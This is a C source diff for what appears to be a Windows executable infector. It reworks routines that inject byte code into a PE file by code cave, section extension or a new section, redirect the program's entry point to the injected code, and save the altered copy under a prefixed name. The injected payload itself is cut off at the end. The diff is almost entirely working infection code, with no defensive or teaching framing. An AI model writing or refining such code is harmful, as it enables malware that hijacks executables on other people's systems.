@@ -3,7 +3,9 @@
 #include <string.h>
 #include <time.h>
 
-static int patchCavern(PEFile *pe, char *buffer, DWORD bufSize)
+#define ALIGN_UP_TO(what, alignment) ((0x00 - alignment ) & what + alignment)
+
+static int patchCavern(PEFile *pe, char *buffer, DWORD origSize)
 {
 	printf("Patch mode - cavern\n");
 	for (int i = 0; i < pe->file_hdr->NumberOfSections; i++) {
@@ -26,21 +28,20 @@ static int patchCavern(PEFile *pe, char *buffer, DWORD bufSize)
 					code.code,
 					code.sizeOfCode);
 				pe->opt_hdr->AddressOfEntryPoint = code_start;
-				return 1;
+				return 0;
 			}
 		}
 	}
-	return 0;
+	return -1;
 }
 
-static int patchExtSect(PEFile *pe, char *buffer, DWORD bufSize)
+static int patchExtSect(PEFile *pe, char *buffer, DWORD origSize)
 {
 	printf("Patch mode - section extension\n");
 	for (int i = 0; i < pe->file_hdr->NumberOfSections; i++) {
 		IMAGE_SECTION_HEADER *sect = pe->sect_hdr_start + i;
 		if (sect->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
-			DWORD aligned_next_addr = ((sect->VirtualAddress + sect->SizeOfRawData) &
-				(-pe->opt_hdr->SectionAlignment)) + pe->opt_hdr->SectionAlignment;
+			DWORD aligned_next_addr = ALIGN_UP_TO(sect->VirtualAddress + sect->SizeOfRawData, pe->opt_hdr->SectionAlignment);
 			DWORD code_max_start = min(sect->VirtualAddress + sect->SizeOfRawData +
 				pe->opt_hdr->FileAlignment - GetMaxCodeSize(), aligned_next_addr - GetMaxCodeSize());
 			DWORD code_min_start = sect->VirtualAddress + sect->SizeOfRawData;
@@ -59,7 +60,7 @@ static int patchExtSect(PEFile *pe, char *buffer, DWORD bufSize)
 
 				memmove(buffer + sect->PointerToRawData + sect->SizeOfRawData + data_shift,
 					buffer + sect->PointerToRawData + sect->SizeOfRawData,
-					bufSize - sect->PointerToRawData - sect->SizeOfRawData);
+					origSize - sect->PointerToRawData - sect->SizeOfRawData);
 
 				memcpy(buffer + sect->PointerToRawData + sect->SizeOfRawData + code_off,
 					code.code,
@@ -74,14 +75,14 @@ static int patchExtSect(PEFile *pe, char *buffer, DWORD bufSize)
 						pe->sect_hdr_start[j].PointerToRawData += data_shift;
 					}
 				}
-				return 1;
+				return data_shift;
 			}
 		}
 	}
-	return 0;
+	return -1;
 }
 
-static int patchNewSect(PEFile *pe, char *buffer, DWORD bufSize)
+static int patchNewSect(PEFile *pe, char *buffer, DWORD origSize)
 {
 	printf("Patch mode - new section\n");
 
@@ -108,12 +109,11 @@ static int patchNewSect(PEFile *pe, char *buffer, DWORD bufSize)
 
 		IMAGE_SECTION_HEADER new_section;
 		new_section.Characteristics = chars;
-		new_section.VirtualAddress = ((max_addr + last_size) & (-pe->opt_hdr->SectionAlignment))
-			+ pe->opt_hdr->SectionAlignment;
+		new_section.VirtualAddress = ALIGN_UP_TO(max_addr + last_size, pe->opt_hdr->SectionAlignment);
 		memcpy(new_section.Name, ".text1\0", 7);
 		new_section.SizeOfRawData = (code_off / pe->opt_hdr->FileAlignment + 1) * pe->opt_hdr->FileAlignment;
 		new_section.Misc.VirtualSize = code_off + GetMaxCodeSize();
-		new_section.PointerToRawData = bufSize;
+		new_section.PointerToRawData = origSize;
 		memcpy(pe->sect_hdr_start + pe->file_hdr->NumberOfSections, &new_section, sizeof(new_section));
 
 		pe->file_hdr->NumberOfSections++;
@@ -122,77 +122,106 @@ static int patchNewSect(PEFile *pe, char *buffer, DWORD bufSize)
 		pe->opt_hdr->SizeOfCode += new_section.Misc.VirtualSize;
 
 		ENTRY_POINT_CODE code = GetEntryPointCodeSmall(new_section.VirtualAddress + code_off, pe->opt_hdr->AddressOfEntryPoint);
-		memcpy(buffer + bufSize + code_off, code.code, code.sizeOfCode);
+		memcpy(buffer + origSize + code_off, code.code, code.sizeOfCode);
 		pe->opt_hdr->AddressOfEntryPoint = new_section.VirtualAddress + code_off;
-		return 1;
+		return new_section.SizeOfRawData;
 	}
-	return 0;
+	return -1;
 }
 
-void ChangeEntryPoint(char* buffer, DWORD bufferSize, char* originalFilename, bool *reallocated)
+int ChangeEntryPoint(HANDLE fileHandle, DWORD fileSize, char* originalFilename)
 {
-	*reallocated = false;
-	srand(time(NULL));
-	PatchMode m = static_cast<PatchMode>(rand() % PATCH_TOTAL);
-
-	PEFile pe;
-	if (ParsePE(buffer, bufferSize, &pe)) {
-		printf("File error - incorrect PE\n");
-		return;
+	char *buffer = (char *)malloc(fileSize);
+	if (!buffer) {
+		printf("Buffer allocation error\n");
+		return 1;
+	}
+	int readSize = ReadFileToBuffer(fileHandle, buffer, fileSize);
+	if (readSize != fileSize)
+	{
+		printf(CAN_NOT_READ_ENTIRE_FILE);
+		return 1;
 	}
 
-	DWORD newBufferSize = bufferSize;
+	srand(time(NULL));
+	PatchMode mode = static_cast<PatchMode>(rand() % PATCH_TOTAL), start_mode = mode;
+
+	PEFile pe;
+	if (ParsePE(buffer, fileSize, &pe)) {
+		printf("File error - incorrect PE\n");
+		return 1;
+	}
+
+	DWORD bufferSize = fileSize;
 
 	bool patch_done = false;
 
 	while (!patch_done) {
-		if (m != PATCH_CAVERN) {
-			if (m == PATCH_EXTSECT) {
-				newBufferSize = bufferSize + pe.opt_hdr->FileAlignment;
-			}
-			else {
-				newBufferSize = bufferSize + pe.opt_hdr->SectionAlignment;
-			}
-			buffer = (char *)realloc(buffer, newBufferSize);
-			if (!buffer) {
-				printf("Error reallocing - return\n");
-				return;
-			}
-			*reallocated = true;
-			if (ParsePE(buffer, newBufferSize, &pe)) {
-				printf("File error - incorrect PE after reallocation\n");
-				return;
-			}
+		switch (mode) {
+		case PATCH_CAVERN:
+			bufferSize = fileSize;
+			break;
+		case PATCH_EXTSECT:
+			bufferSize = fileSize + pe.opt_hdr->FileAlignment;
+			break;
+		case PATCH_NEWSECT:
+			bufferSize = fileSize + pe.opt_hdr->SectionAlignment;
+			break;
+		default:
+			break;
 		}
 
-		if (m == PATCH_CAVERN) {
-			patch_done = patchCavern(&pe, buffer, bufferSize);
+		buffer = (char *)realloc(buffer, bufferSize);
+		if (!buffer) {
+			printf("Error reallocing - return\n");
+			return 1;
 		}
-		else if (m == PATCH_EXTSECT) {
-			patch_done = patchExtSect(&pe, buffer, bufferSize);
+		if (ParsePE(buffer, bufferSize, &pe)) {
+			printf("File error - incorrect PE after reallocation\n");
+			return 1;
 		}
-		else if (m == PATCH_NEWSECT) {
-			patch_done = patchNewSect(&pe, buffer, bufferSize);
+
+		DWORD sizeFix = -1;
+		switch (mode) {
+		case PATCH_CAVERN:
+			sizeFix = patchCavern(&pe, buffer, fileSize);
+			break;
+		case PATCH_EXTSECT:
+			sizeFix = patchExtSect(&pe, buffer, fileSize);
+			break;
+		case PATCH_NEWSECT:
+			sizeFix = patchNewSect(&pe, buffer, fileSize);
+			break;
+		default:
+			break;
 		}
+
+		if (sizeFix == -1) {
+			patch_done = false;
+		} else {
+			patch_done = true;
+			bufferSize = fileSize + sizeFix;
+		}
+
 		if (!patch_done) {
-			m = static_cast<PatchMode>((m + 1) % PATCH_TOTAL);
+			mode = static_cast<PatchMode>((mode + 1) % PATCH_TOTAL);
+		}
+		if (mode == start_mode) {
+			break;
 		}
 	}
 
 	if (patch_done) {
-		printf("File succesfully patched\n");
-	}
-	else {
-		printf("Patching failed\n");
+		int len = strlen(originalFilename);
+		char *new_name = (char *)calloc(len + 2, sizeof(*new_name));
+		memcpy(new_name + 1, originalFilename, len);
+		new_name[0] = '1';
+		WriteFileFromBuffer(new_name, buffer, bufferSize);
+		free(new_name);
 	}
 
-	int len = strlen(originalFilename);
-	char *new_name = (char *)calloc(len + 2, sizeof(*new_name));
-	memcpy(new_name + 1, originalFilename, len);
-	new_name[0] = '1';
-	new_name[len + 1] = 0;
-	WriteFileFromBuffer(new_name, buffer, newBufferSize);
-	free(new_name);
+	free(buffer);
+	return !patch_done;
 }
 
 static char byteCode[] = {
